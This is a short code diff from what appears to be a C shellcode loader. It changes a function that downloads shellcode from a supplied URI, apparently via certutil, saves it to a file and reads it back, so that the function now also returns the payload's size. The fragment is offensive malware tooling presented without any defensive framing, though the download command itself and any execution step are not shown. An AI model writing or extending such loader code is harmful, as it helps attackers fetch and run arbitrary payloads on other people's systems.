@@ -80,8 +80,11 @@ unsigned char *load_textfile(char *fvalue, int size)
 }
 
 
-// Downloads the shellcode from the URI specified in arg1
-unsigned char* get_shellcode(char *arg1) {
+// Downloads the shellcode from the URI specified in arg1 to a file.
+// The shellcode is then retrieved from the file.
+//
+// shellcode_size receives the size of the shellcode in bytes.
+unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
 	#ifdef PRINT_DEBUG
 		printf("download shellcode to file via certutil\n");
 	#endif
@@ -103,6 +106,6 @@ unsigned char* get_shellcode(char *arg1) {
 		printf("sh_filename = %s\n", sh_filename);
 	#endif
 	
-	int size = get_filesize(sh_filename);	
-	return load_textfile(sh_filename, size);	
+	*shellcode_size = get_filesize(sh_filename);	
+	return load_textfile(sh_filename, *shellcode_size);	
 }
